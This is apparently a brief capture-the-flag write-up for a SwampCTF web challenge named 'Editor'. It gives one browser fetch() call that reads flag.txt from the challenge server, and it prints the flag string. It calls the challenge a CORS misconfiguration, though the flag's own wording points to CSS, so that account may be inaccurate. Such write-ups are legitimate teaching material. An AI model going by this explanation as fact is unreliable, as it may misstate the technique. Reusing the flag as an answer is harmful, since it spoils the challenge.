## Editor

### **Challenge:**

The challenge involved **exploiting a misconfigured CORS (Cross-Origin Resource Sharing)**.

### **Solution:**

- Ran the following **fetch request** in the browser console to retrieve the flag from the server:
  ```javascript
  fetch("http://chals.swampctf.com:47821/flag.txt")
    .then(response => response.text())
    .then(data => console.log(data));
  ```
- The response returned the flag.

### **Flag:**

```
swampCTF{c55_qu3r135_n07_j5}
```

